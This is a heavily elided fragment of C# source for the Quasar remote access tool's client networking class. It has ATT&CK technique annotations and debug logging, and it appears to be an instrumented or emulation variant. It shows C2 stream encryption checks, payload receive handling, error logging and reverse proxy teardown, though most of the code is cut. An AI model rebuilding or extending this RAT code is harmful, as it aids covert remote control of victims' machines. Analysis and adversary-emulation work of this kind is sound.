...
namespace Quasar.Client.Networking
{
    public class Client : ISender
    {
        ...
        /// - T1095: Non-Application Layer Protocol<br/>
            ...
            try
            {
                ...
                if (handle.Connected)
                {
                    ...
                    if (!_stream.IsEncrypted) {
                        throw new Exception("Stream not encrypted");
                    }
                    Logger.Debug("Stream cipher for C2 connection: " + _stream.CipherAlgorithm.ToString());
                        ...
                        case ReceiveType.Payload:
                            {
                                ...
                                {
                                    process = false;
                                    Logger.Error(String.Format("AsyncReceive: exception when reading payload ReceiveType: {0}", ex.ToString()));
                                    Disconnect();
                                    break;
                                }
                                ...
                                if (_writeOffset - HEADER_SIZE == _payloadLen)
                                {
                                    ...
                                    {
                                        process = false;
                                        Logger.Error(String.Format("AsyncReceive: exception when reading payload: {0}", ex.ToString()));
                                        Disconnect();
                                        break;
                                    }
        ...
        private void SafeSendMessage(IMessage message)
        {
            ...
            {
                Logger.Error(String.Format("SafeSendMessage: Failed to send message: {0}", ex.ToString()));
                Disconnect();
                SendCleanup(true);
            }
            finally
            ...
            if (_stream != null)
            {
                ...
                if (_proxyClients != null)
                {
                    lock (_proxyClientsLock)
                    {
                        ...
                        {
                            Logger.Error(String.Format("Disconnect: exception when disconnecting reverse proxy client: {0}", ex.ToString()));
                        }
                    }
                }
            }
